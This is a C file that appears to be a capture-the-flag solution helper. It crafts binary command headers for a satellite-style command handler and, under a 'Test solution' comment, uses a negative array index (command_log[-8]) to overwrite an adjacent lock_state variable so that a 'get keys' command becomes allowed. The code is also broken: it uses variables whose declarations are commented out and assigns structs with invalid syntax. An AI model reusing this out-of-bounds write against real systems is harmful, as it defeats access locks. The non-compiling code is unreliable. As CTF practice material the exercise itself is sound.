#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define COMMAND_LIST_LENGTH 10

typedef enum lock_states {
	UNLOCKED = 			0,
	LOCKED = 			1,
} lock_states;

typedef enum command_id_type {
	COMMAND_ADCS_ON = 		0,
	COMMAND_ADCS_OFF =		1,
	COMMAND_CNDH_ON =		2,
	COMMAND_CNDH_OFF =		3,
	COMMAND_SPM =			4,
	COMMAND_EPM =			5,
	COMMAND_RCM =			6,
	COMMAND_DCM =			7,
	COMMAND_TTEST =			-8,
	COMMAND_GETKEYS =		9, // only allowed in unlocked state
} command_id_type;

typedef struct command_header{
	short version : 16;
	short type : 16;
	command_id_type id : 32;
} command_header;

unsigned int lock_state;
char command_log[COMMAND_LIST_LENGTH];

int main() {

    lock_state = LOCKED;

    printf("Address of lock_state:       %p\n", &lock_state);
	printf("Address of command_log: %p\n", &command_log);

    // command_id_type
    // command_id_type newid = COMMAND_DCM;
    // command_header cmd = {12, 13, newid};
    // FILE* f = fopen("command_header_1.bin", "w");
    // printf("\n%p", f);
    // fwrite(&newid, sizeof(command_header), 1, f);
    // fclose(f);

    // command_header
    newid = COMMAND_TTEST;
    cmd = {12, 13, newid};
    f = fopen("command_header.bin", "w");
    printf("%p", f);
    fwrite(&cmd, sizeof(command_header), 1, f);
    fclose(f);

    // flag!
    newid = COMMAND_GETKEYS;
    cmd = {12, 13, newid};
    f = fopen("get_flag.bin", "w");
    printf("%p", f);
    fwrite(&cmd, sizeof(command_header), 1, f);
    fclose(f);

    printf("\nID: %d\n", cmd.id);

    // Test solution
    printf("Lock State Before: %u\n", lock_state);
    command_log[-8] += 100;
    printf("Lock State After: %u\n", lock_state);
    

    // printf(cmd);

}